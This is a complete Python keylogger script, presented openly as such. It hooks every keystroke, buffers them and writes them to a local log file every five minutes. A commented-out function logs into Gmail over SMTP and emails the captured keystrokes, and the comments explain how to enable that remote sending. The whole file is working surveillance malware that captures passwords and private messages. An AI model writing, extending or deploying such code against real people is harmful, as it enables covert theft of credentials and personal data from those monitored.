import keyboard
import smtplib
from threading import Semaphore, Timer


TIME_INTERVAL=300 #Interval in seconds
EMAIL_ADDRESS="" #Enter your email id here
EMAIL_PASS='' #Enter your email password here

class Keylogger:
    def __init__(self,interval):
        self.interval=interval
        self.log=""
        self.semaphore = Semaphore(0)
    
    def callback(self,event):
        name=event.name
        if len(name)>1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log+=name

    #uncomment this function if want to enable remote logging i.e. through email
    '''def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    '''

    def report(self):
        if self.log:
            fs=open("./log.txt","a+") #delete or comment if want to disable local logs 
            fs.write(self.log) #delete or uncomment if want to disable local logs 
            #self.sendmail(EMAIL_ADDRESS, EMAIL_PASS, self.log) #uncomment if want to send logs through mail
            fs.close() #delete or comment if want to disable local logs 
        
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        print(self.log)
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = Keylogger(interval=TIME_INTERVAL)
    keylogger.start()